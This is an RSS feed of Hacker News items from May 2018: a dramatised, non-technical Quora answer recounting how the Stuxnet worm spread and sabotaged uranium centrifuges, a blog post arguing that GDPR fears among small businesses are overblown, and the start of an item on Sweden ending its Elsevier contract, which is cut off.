<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>The Stuxnet worm may be the most sophisticated software ever written</title>
<link>https://www.quora.com/What-is-the-most-sophisticated-piece-of-software-code-ever-written/answer/John-Byrd-2</link>
<guid isPermaLink="true" >https://www.quora.com/What-is-the-most-sophisticated-piece-of-software-code-ever-written/answer/John-Byrd-2</guid>
<description>&lt;p class=&quot;ui_qtext_para&quot;&gt;&lt;span class=&quot;ui_qtext_rendered_qtext&quot;&gt;Buckle in.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;&lt;span class=&quot;ui_qtext_rendered_qtext&quot;&gt;The most sophisticated software in history was written by a team of people whose names we do not know.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;&lt;span class=&quot;ui_qtext_rendered_qtext&quot;&gt;It’s a computer worm. The worm was written, probably, between 2005 and 2010.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;&lt;span class=&quot;ui_qtext_rendered_qtext&quot;&gt;Because the worm is so complex and sophisticated, I can only give the most superficial outline of what it does.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;&lt;span class=&quot;ui_qtext_rendered_qtext&quot;&gt;This worm exists first on a USB drive. Someone could just find that USB drive laying around, or get it in the mail, and wonder what was on it. When that USB drive is inserted into a Windows PC, without the user knowing it, that worm will quietly run itself, and copy itself to that PC. It has at least three ways of trying to get itself to run. If one way doesn’t work, it tries another. At least two of these methods to launch itself were completely new then, and both of them used two independent, secret bugs in Windows that no one else knew about, until this worm came along.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;&lt;span class=&quot;ui_qtext_rendered_qtext&quot;&gt;Once the worm runs itself on a PC, it tries to get administrator access on that PC. It doesn’t mind if there’s antivirus software installed — the worm can sneak around most antivirus software. Then, based on the version of Windows it’s running on, the worm will try one of two previously unknown methods of getting that administrator access on that PC. Until this worm was released, no one knew about these secret bugs in Windows either.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;&lt;span class=&quot;ui_qtext_rendered_qtext&quot;&gt;At this point, the worm is now able to cover its tracks by getting underneath the operating system, so that no antivirus software can detect that it exists. It binds itself secretly to that PC, so that even if you look on the disk for where the worm should be, you will see nothing. This worm hides so well, that the worm ran around the Internet for over a year without any security company in the world recognizing that it even &lt;em&gt;existed&lt;/em&gt;.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;&lt;span class=&quot;ui_qtext_rendered_qtext&quot;&gt;The software then checks to see if it can get on the Internet. If it can, it attempts to visit either &lt;span class=&quot;qlink_container&quot;&gt;&lt;a href=&quot;http://www.mypremierfutbol.com&quot; rel=&quot;noopener nofollow&quot; target=&quot;_blank&quot; onclick=&quot;return Q.openUrl(this, 83205980);&quot; class=&quot;external_link&quot;&gt;http://www.mypremierfutbol.com&lt;/a&gt;&lt;/span&gt; or &lt;span class=&quot;qlink_container&quot;&gt;&lt;a href=&quot;http://www.todaysfutbol.com&quot; rel=&quot;noopener nofollow&quot; target=&quot;_blank&quot; onclick=&quot;return Q.openUrl(this, 83205980);&quot; class=&quot;external_link&quot;&gt;http://www.todaysfutbol.com&lt;/a&gt;&lt;/span&gt; . At the time, these servers were in Malaysia and Denmark. It opens an encrypted link and tells these servers that it has succeeded in owning a new PC. The worm then automatically updates itself with the newest version.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;At this point, the worm makes copies of itself to any &lt;em&gt;other&lt;/em&gt; USB sticks you happen to plug in. It does this by installing a carefully designed but fake disk driver. This driver was digitally signed by Realtek, which means that the authors of the worm were somehow able to break into the most secure location in a huge Taiwanese company, and steal the most secret key that this company owns, without Realtek finding out about it.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;Later, whoever wrote that driver started signing it with secret keys from JMicron, another big Taiwanese company. Yet again, the authors had to figure out how to break into the most secure location in &lt;em&gt;that&lt;/em&gt; company and steal the most secure key that &lt;em&gt;that&lt;/em&gt; company owns, without JMicron finding out about it.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;This worm we are talking about is &lt;em&gt;sophisticated&lt;/em&gt;.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;And it hasn’t even got &lt;em&gt;started&lt;/em&gt; yet.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;At this point, the worm makes use of two recently discovered Windows bugs. One bug relates to network printers, and the other relates to network files. The worm uses those bugs to install itself across the local network, onto all the &lt;em&gt;other&lt;/em&gt; computers in the facility.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;Now, the worm looks around for a very specific bit of control software, designed by Siemens for automating large industrial machinery. Once it finds it, it uses (you guessed it) &lt;em&gt;yet another&lt;/em&gt; previously unknown bug for copying itself into the programmable logic of the industrial controller. Once the worm digs into this controller, &lt;em&gt;it’s in there for good&lt;/em&gt;. No amount of replacing or disinfecting PCs can get rid of the worm now.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;The worm checks for attached industrial electric motors from two specific companies. One of those companies is in Iran, and the other is in Finland. The specific motors it searches for are called variable-frequency drives. They’re used for running industrial centrifuges. You can purify many kinds of chemicals in centrifuges.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;Such as uranium.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;Now at this point, since the worm has complete control of the centrifuges, it can do anything it wants with them. The worm can shut them all down. The worm can destroy them all immediately — just spin them over maximum speed until they all shatter like bombs, killing anyone who happens to be standing near.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;But no. This is a &lt;em&gt;sophisticated&lt;/em&gt; worm. The worm has &lt;em&gt;other plans&lt;/em&gt;.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;Once it controls every centrifuge in your facility… the worm just &lt;em&gt;goes to sleep.&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;Days pass. Or weeks. Or seconds.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;When the worm decides the time is right, the worm quietly wakes itself up. The worm randomly picks a few of those centrifuges while they are purifying uranium. The worm locks them, so that if someone notices that something is wrong, a human can’t turn the centrifuges off.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;And then, stealthily, the worm starts spinning those centrifuges… a little &lt;em&gt;wrong&lt;/em&gt;. Not a crazy amount wrong, mind you. Just, y’know, a &lt;em&gt;little&lt;/em&gt; too fast. Or a &lt;em&gt;little&lt;/em&gt; too slow. Just a tiny bit out of safe parameters.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;At the same time, it increases the gas pressure in those centrifuges. The gas in those centrifuges is called UF6. Pretty nasty stuff. The worm makes the pressure of that UF6, just a &lt;em&gt;tiny bit&lt;/em&gt; out of safe parameters. Just enough that the UF6 gas in the centrifuges, has a small chance of &lt;em&gt;turning into rock&lt;/em&gt;, while the centrifuge is spinning.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;Centrifuges don’t like running too fast or too slow. And they don’t like rocks either.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;The worm has one last trick up its sleeve. And it’s pure evil genius.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;In addition to everything else it’s doing, the worm is now playing us back a 21 second data recording on our computer screens, that it captured when the centrifuges were working normally.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;The worm plays the recording over and over, in a loop.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;As a result, all the centrifuge data on the computer screens looks completely fine, to us humans.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;But it’s all just a fake recording, produced by the worm.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;Now let’s imagine that &lt;em&gt;you&lt;/em&gt; are responsible for purifying uranium using this huge industrial factory. And everything seems to be working okay. Maybe some of the motors sound a little off, but all the numbers on the computer show that the centrifuge motors are running exactly as designed.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;Then the centrifuges start breaking. Randomly, one after another. Usually they die quietly. Rarely though, they make a &lt;em&gt;scene&lt;/em&gt; when they die. And the uranium yield, it keeps plummeting. Uranium has to be &lt;em&gt;pure&lt;/em&gt;. Your uranium is not pure enough to do anything useful.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;What would you do, if you were running that uranium enrichment facility? You’d check everything over and over and over, not understanding why everything was off. You could replace every single PC in your facility if you wanted to.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;But the centrifuges would go right on breaking. And you have &lt;em&gt;no possible way of knowing why.&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;And on your watch, eventually, about 1000 centrifuges would fail or be taken offline. You’d go a little crazy, trying to figure out why nothing was working as designed.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;&lt;em&gt;That is exactly what happened.&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;You would never expect that all those problems were caused by &lt;em&gt;a computer worm&lt;/em&gt;, the most devious and intelligent computer worm in history, written by some incredibly secret team with unlimited money and unlimited resources, designed with exactly one purpose in mind: &lt;strong&gt;to sneak past every known digital defense, and to destroy your country’s nuclear bomb program, all without getting caught.&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;To have one piece of software do any ONE of those things would be a small miracle. To have it do ALL of those things and many more, well…&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;… the &lt;span class=&quot;qlink_container&quot;&gt;&lt;a href=&quot;https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf&quot; rel=&quot;noopener nofollow&quot; target=&quot;_blank&quot; onclick=&quot;return Q.openUrl(this, 83205980);&quot; class=&quot;external_link&quot; data-qt-tooltip=&quot;symantec.com&quot;&gt;Stuxnet worm&lt;/a&gt;&lt;/span&gt; would have to be the most sophisticated software ever written.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;More &lt;span class=&quot;qlink_container&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Stuxnet&quot; rel=&quot;noopener nofollow&quot; target=&quot;_blank&quot; onclick=&quot;return Q.openUrl(this, 83205980);&quot; class=&quot;external_link&quot; data-qt-tooltip=&quot;wikipedia.org&quot;&gt;here&lt;/a&gt;&lt;/span&gt;, and &lt;span class=&quot;qlink_container&quot;&gt;&lt;a href=&quot;https://www.langner.com/wp-content/uploads/2017/03/to-kill-a-centrifuge.pdf&quot; rel=&quot;noopener nofollow&quot; target=&quot;_blank&quot; onclick=&quot;return Q.openUrl(this, 83205980);&quot; class=&quot;external_link&quot; data-qt-tooltip=&quot;langner.com&quot;&gt;here&lt;/a&gt;&lt;/span&gt;.&lt;/p&gt;
&lt;p class=&quot;ui_qtext_para&quot;&gt;EDIT: this article you just read is awesome. Share it, people.&lt;/p&gt;
</description>
<pubDate>Fri, 18 May 2018 09:31:53 +0000</pubDate>
<dc:creator>graposaymaname</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.quora.com/What-is-the-most-sophisticated-piece-of-software-code-ever-written/answer/John-Byrd-2</dc:identifier>
</item>
<item>
<title>GDPR Hysteria</title>
<link>https://jacquesmattheij.com/gdpr-hysteria</link>
<guid isPermaLink="true" >https://jacquesmattheij.com/gdpr-hysteria</guid>
<description>&lt;p&gt;In another week the &lt;a href=&quot;https://gdpr-info.eu/&quot;&gt;GDPR&lt;/a&gt;, or the General Data Protection Regulation will become enforceable and it appears that unlike any other law to date this particular one has the interesting side effect of causing mass hysteria in the otherwise rational tech sector.&lt;/p&gt;
&lt;p&gt;This post is an attempt to calm the nerves of those that feel that the(ir) world is about to come to an end, the important first principle when it comes to dealing with any laws, including this one is &lt;a href=&quot;https://en.wikipedia.org/wiki/Phrases_from_The_Hitchhiker%27s_Guide_to_the_Galaxy#Don%27t_Panic&quot;&gt;Don’t Panic&lt;/a&gt;. I’m aiming this post squarely at the owners of SME’s that are active on the world wide web and that feel overwhelmed by this development. A bit of background about myself: I’ve been involved in the M&amp;amp;A scene for about a decade, do technical due diligence for a living (together with a team of 8). This practice and my feeling that the battle for privacy on the web is one worth winning which has led me to study online privacy in some detail puts me in an excellent position to see the impact of this legislation first hand as well as how companies tend to deal with it.&lt;/p&gt;
&lt;p&gt;First some context: &lt;strong&gt;Every&lt;/strong&gt; company and every project or hobby ever has to be compliant with the law. Whether or not that is possible usually depends on what you are doing, your local legislative climate and, obviously, the law. So whether or not you are doing something for profit, as a hobby or making a few bucks on the side all the way up to a company doing billions in turnover with 10’s of thousands of employees does not matter. Compliance with the law is the norm. If you are doing business abroad then this means that you may have to be compliant with the laws of another country, and the web being as connected as it is this means there is a fairly high chance that your little domain will be impacted by the laws from multiple jurisdictions. For people from relatively insignificant (in terms of power in the rest of the world) countries this is not exactly news, they are already impacted by the laws from very powerful countries and so they are probably well adapted to this. For the inhabitants of large countries that so far have been able to ignore the laws of other places this is a new situation which may require some new level of understanding.&lt;/p&gt;
&lt;p&gt;The easiest way to gain some of this understanding is to realize that you already have to be compliant with a lot of laws in order to be able to operate anything at all, even a lemonade stand comes with the following legal implications:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;food safety laws&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;commercial operation laws&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;municipal laws&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;administrative laws&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;employment law&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;and possibly even others&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;So, &lt;em&gt;nothing&lt;/em&gt; is really simple but one more law added to the pile is also not going to be the end of the world. Because this article is not aimed at large enterprises and because I am not a lawyer (yes, that’s one of those annoying disclaimers) this article is not written in legalese, but there will be some terms from the GDPR that I will not be able to get around. These terms will be defined when they are first used, a search with your favorite, GDPR compliant search engine will usually give you more context than I can put in this article.&lt;/p&gt;
&lt;p&gt;The first thing you have to realize in coming to terms with the GDPR is that ‘one law fits all’. The GDPR was written as a law to repair the lack of adherence to its predecessor, the DPD, the European Data Privacy Directive, which has had the unfortunate shortcoming of being a directive rather than a regulation. The effect of this - and the lack of teeth - was that it was mostly ignored by businesses. This is a recurring theme in our collective history: first there will be room to self regulate, if that does not work there will be a directive and if all that fails then finally there will be a law with penalties in case of non compliance. As the sign on the maps on billboards all over the world says ‘You are here!’. Now - in exactly 7 days - we will have a law come into effect that has some serious teeth and that you will - for a change - not be able to ignore.&lt;/p&gt;
&lt;p&gt;So what form does the panic take? I’ve seen a lot of different kinds of it but most of it revolves around the a fairly limited number of themes that I will try to address one by one from the perspective of a small business owner in order to reduce the emotional levels to something more manageable. Getting these fallacies out the way before going into more detail about the kind of impact the GDPR does have is productive because it will allow us to concentrate in more detail on what actually matters.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The GDPR is going to expose me to fines of up to 20 million Euros for even the slightest transgression&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;No, the GDPR has the potential to escalate to those levels but in the spirit of the good natured enforcers at the various data protection agencies in Europe they will &lt;em&gt;first&lt;/em&gt; warn you with a notice that you are not in compliance with the law, give you some period of time to become compliant and will - if you ignore them - fine you. That fine will be proportional to the transgression. You can of course ignore the fine and then ‘all bets are off’ but if you pay the fine &lt;em&gt;and&lt;/em&gt; become compliant you can consider the matter closed. The typical EU pattern in case of repeated transgressions on the same subject is increasing fines. This can get expensive quickly and most businesses tend to adjust their processes promptly once they have been fined the first time. The reason why I am sure this is the way it will go down is this is exactly how it has been done so far, every interaction with data protection authorities has followed the exact same pattern: warn, fine, increased fines. There are no known cases - though I’m willing to be surprised on this one, but none that I can find - where an entity was presented with a huge fine without first being given a chance to comply with the law.&lt;/p&gt;
&lt;p&gt;Note that the 20 million Euros or 4% of global turnover is the &lt;em&gt;maximum&lt;/em&gt; fine, the specific language is ‘a fine up to €20 million or up to 4% of the annual worldwide turnover of the preceding financial year in case of an enterprise, whichever is greater’, so that’s the maximum of the fine that’s being set by the 20 million or the 4%, and this bit is there to ensure that even the likes of Facebook and Google will not simply ignore the law and pay the fine to be able to continue as they have so far. This in no way should be read as you, the small business operator will face a fine of 20 million for each and every infraction that could be found.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The GDPR will enable anybody to be able to sue me, even from abroad&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The GDPR does not have this effect, but you may be interested to know that &lt;em&gt;anybody&lt;/em&gt; can sue you or your business for whatever reason strikes their fancy. This is a direct consequence of doing business and has nothing to do with a particular law. What the GDPR allows private individuals to do is to contact their regulators and to complain &lt;em&gt;if&lt;/em&gt; you decide to ignore their requests. So if John Doe wants to have his data removed from your service and you tell him to get stuffed then John has the right to alert his regulator to the fact that you are probably not in compliance. If the data protection entity of John’s country feels the case has merit they will send you the letter mentioned above. If not you might never hear from them. The data protection authorities will function as a clearing house. If you feel this is selective enforcement then you should be happy about it for a change: by providing this clearing house function the burden of regulation will be substantially lower than it would be without and it will ensure that the public will not be able to use the GDPR to harass businesses, and they will allow the insertion of a bar to be met before action is taken.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Fines will land without warning and will be draconian&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;No, fines will be proportional and will only be levied after a chance to become compliant has been given. This has been the case in all other EU law regarding privacy to date, this one will not be any different. The EU regulators see their job as ensuring compliance, not as creating a source of income.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The GDPR will require me to deal with complaints/paperwork in 28 different languages&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The text of the GDPR is available in English, a typical regulator will send you a notice in a language that you can understand. This goes for everything in the EU that has to do with the law, from traffic fines to copyright law and everything else. If the EU is good at dealing with something it is dealing with other languages. So the paperwork - if any - that you will receive will be in a language that you can read and if you can’t there will be an English translation available. Case in point: I got a parking ticket in Paris last year where my car was on the wrong side of the road on a particular day I’d parked there on Monday, apparently on Tuesday you have to park your car on the other side of the road and me being a stupid tourist I thought I was safe because everybody else parked there too. I received my ticket in the mail a few days later, with a French text, an English text, and - most surprising - a perfectly worded Dutch text complete with instructions on how to have myself represented in court if I wished to contest the fine and instructions for paying the fine if I did not want to contest it.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The GDPR will require me to hire people and my entity is too small to be able to afford this&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;No, the GDPR will require you to assign certain roles to ensure that someone is in charge of privacy related stuff.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Faceless bureaucrats will use the selective enforcement of the GDPR to stuff the coffers of the EU at the expense of foreign companies&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The EU tends to use fines as a means of forcing a company into compliance. Companies that are large and that have large European holdings or that use the EU to avoid paying taxes rightly worry about this particular aspect, &lt;em&gt;especially&lt;/em&gt; if they have constructed their business around massive databases of profiles on EU citizens. If this isn’t you then you can probably ignore this aspect of EU legislation. If you’re Mark Zuckerberg however I would definitely advise &lt;em&gt;not&lt;/em&gt; to ignore this, however the chances of Mark reading this blog post are nil.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The EU is over-reaching here, as a foreigner I should be free to just comply with my local laws and ignore the rest&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;As soon as you do business abroad you will have to comply with the laws of those countries. That’s maybe not what you were hoping for but this has always been the case. For physical products there are all kinds of entities that ensure compliance with the laws of other countries including rules for manufacturing, transportation, storage, ingredients - all the way back to the source - and so on depending on the context and nature of your business. For online businesses this has never been any different for instance you have to comply with copyright law, laws on online gambling, the DMCA and lots of other laws that are essentially local in nature (though copyright laws were harmonized long ago to make this easier).&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Processing all these end-user requests will be a huge burden&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Then automate it. If you could automate the collection of the data in the first place then you &lt;strong&gt;definitely&lt;/strong&gt; can automate the rest of the life cycle. There is no technical hurdle companies won’t jump through if it gets them juicy bits of data but as soon as the data needs to be removed we’re suddenly back in the stone age and some artisan with a chisel and hammer will have to jump into action to delete the records and this will take &lt;strong&gt;decades&lt;/strong&gt; for even a small website. Such arguments are not made in good faith and in general make the person making them look pretty silly after all nobody ever complained about collecting data, in fact there are whole armies of programmers working hard to scrape data from public websites which is a lot more work than properly dealing with the life cycle of that data after it has been collected. So yes, it is a burden, no, the burden isn’t huge &lt;strong&gt;unless you expressly make it so&lt;/strong&gt; but that’s your problem.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;This law was sprung on us, there is absolutely no way I’m going to be prepared a week from now&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The law has been in effect for over two years at this point, and the DPD, the European Data Protection Directive has been in effect for &lt;em&gt;over two decades&lt;/em&gt;. So no, this law was not sprung on anybody, though it is very well possible that you only became aware of it a few weeks or months (or days?) ago. If that’s the case do not panic, you too will &lt;em&gt;most likely&lt;/em&gt; be fine.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;It is impossible to be compliant with this law&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Well, this website is fully compliant with the law, so at least in this particular case it seems to work. Why? Because I don’t store any information about you. That’s a conscious choice on my part which I made &lt;em&gt;long&lt;/em&gt; before the GDPR was even talked about in public. But if your situation is more complex then you too can be compliant, or at least - and this is key - you could &lt;em&gt;try&lt;/em&gt; to be compliant. For instance, one oft heard argument is that no webserver (or even any internet service) is going be able to be compliant because all web servers log IP addresses, and IP addresses are PII. But that argument does not hold water. There are several reasons for that, the major ones being: webservers only log IP addresses if you configure them to do so. Almost all webservers have a formatting option that determines what exactly is logged and you could configure your webserver to not log the whole address but just the network portion. You also have the option to log the address and to disclose that you do so in your privacy policy, but then you will have to allow for the removal of that data on request, which you may find burdensome (or not, that depends on the volume of such requests). Finally, you may have a legitimate reason to log the IP address, provided you delete it after you are done with whatever use you collected it for in the first place. There is enough room in the GDPR to hold on to the address for 30 days with a possible extension of another 60 days after which an automated reply to the user can tell them their IP address was purged and you’d be in compliance. That’s one of the reasons why I think the GDPR is a surprisingly good law, most of the times when legislation is written that impacts technology the end result is absolutely unworkable, in this case most scenarios seem to work well for all parties involved.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Becoming compliant with this law will cause my business to go under&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;I’m terribly sorry to hear that. But consider this: this law was written with the express purpose to rein in some of the worst violations of the privacy of EU citizens during their online activities. If becoming compliant with the law will cause your business to go under that is more or less the same as saying that your business is built on gross privacy violations. So if that’s your business model then good riddance to you and your company. However if that is not your business model then most likely you will be just fine.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;It’s not fair, I have no representation in the EU because I’m not from there, why should my company comply?&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Because you wish to do business in the EU. For what it’s worth, there are plenty of laws that project across the borders of countries and harmonization of laws between countries means that people are not always aware of the fact that this is happening. The DMCA is a nice example. Besides that, privacy is a fairly hot topic and there is hope in privacy advocacy circles that the EU is lighting the way here and that other countries will likely follow its example.&lt;/p&gt;
&lt;p&gt;The fact that you or your company do not have representation in the EU does not mean you get to ignore the law, if you could then that would mean an automatic disadvantage for others that do play by the rules. You ignore the law at your peril.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;I don’t want to end up being arrested for GDPR violations when I go on a holiday in Europe (yes, I really saw that one)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;This is so far fetched it is comical. The EU does not operate that way, and besides, why would you wilfully break the law and continue to do so after you have been made aware of this? I’ve yet to hear about a single individual that was lifted from their bed in a French bed and breakfast during their well deserved holiday, but maybe you’ll be the first. If it happens let me know and I’ll come visit you in jail, I might even throw some bucks towards your defense fund. (Apologies for the flippant tone in this section but it really irks me, the only case like this that I’m aware of was the USA arresting one David Carruthers of betonsports.com.)&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;My business can not be compliant with this draconian and burdensome law&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;In that case please shut down or do not serve EU customers. But be aware that (1) you are leaving a nice opening for a competitor and (2) you are probably doing something you should not be doing in the first place, in which I would say the law is working as intended.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The law is so complicated, there is no way I could ever make sense of it&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;As laws come I was actually surprised by how easy it is to read it. It’s not particularly large, it uses mostly clear language and it &lt;em&gt;usually&lt;/em&gt; (but critically, not always and this is a justified complaint) defines its terms. The biggest area where the lack of definition is annoying (but understandable) is when it comes to determining at what size company you need to take certain measures. I understand the complainers and I understand the lawmakers positions and this probably could have been handled in a more robust manner. But there are good reasons for doing it this way, as I hope to illustrate later.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;I can’t afford the risks associated with this law so I am shutting down/I will lock Europeans out&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Ok. Bye. But make sure you &lt;em&gt;really&lt;/em&gt; understand those risks and please understand as well that it may not be possible for you to lock Europeans out reliably enough to not have any exposure under the law and realize that there are lots of other laws that you are also exposed to that could cause you to be wiped out. This law is really no different than any others in that respect. The price of using the web as a world stage is that you effectively are interacting with the legal domains of every country that you do business with.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;I should be able to engage in a contract with my users that lets them opt out from this law so I can ignore it&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;For once the lawmakers saw what was coming and they actually repaired this before it became an issue. I suspect that the ‘cookie law’ debacle made them realise that companies have absolutely no scruples when it comes to things like this and will happily blackmail their users into consenting to something that they’d rather not consent to just to be able to participate in what is more and more unavoidable: online interaction.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;For large companies the burden is manageable, for small companies it is too high&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;From what I’ve seen in my practice over the last couple of years the burden is roughly proportional to three things:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;    - the amount of data you hold

    - the number of employees in your company

    - the kind of data you hold
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;In effect the burden of a large company holding vast amounts of sensitive data will likely be very large. The burden on a small company holding small amounts of non-sensitive data will be very low or even none.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Nobody knows what the GDPR really means&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The text is readily available, it is true that there are no meaningful certification programmes as yet but in time these will be available. In some ways this is a pity because it would be nice to be able to say ‘We’re compliant because we have a stamp of approval from such and such a certification authority’ but at the same time the lack of certification requirements actually goes a long way towards reducing the burden on small companies.&lt;/p&gt;
&lt;p&gt;Anyway, you get the gist by now. Each of these misconceptions is like dry tinder in the hands of those that wish to have a good old GDPR bonfire inciting others to panic as well and in general does not really contribute to the discussion. As a rule the statements are either made by well meaning people who have not really done their homework or they are done by people whose businesses depend on being able to violate other people’s privacy and they are hoping that by stoking this fire they will be able to turn the sentiment against the GDPR, to play politics. And as we all know we are in a fact-free environment when it comes to politics nowadays so anything goes. With that out of the way let’s look at some of the &lt;em&gt;actual&lt;/em&gt; impact of the GDPR, at what level your exposure most likely is and how - according to me - the future will play out.&lt;/p&gt;
&lt;p&gt;… to be continued, hopefully on Monday …&lt;/p&gt;
</description>
<pubDate>Fri, 18 May 2018 07:59:02 +0000</pubDate>
<dc:creator>grabeh</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://jacquesmattheij.com/gdpr-hysteria</dc:identifier>
</item>
<item>
<title>Sweden ends contract with Elsevier, moving for open access for science articles</title>
<link>https://www.snip.today/post/sweden-ends-contract-with-science-publisher-elsevier-moving-for-open-access-for-scientific-articles/</link>
<guid isPermaLink="true" >https://www.snip.today/post/sweden-ends-contract-with-science-publisher-elsevier-moving-for-open-access-for-scientific-articles/</guid>
<description>&lt;div readability=&quot;34&quot;&gt;
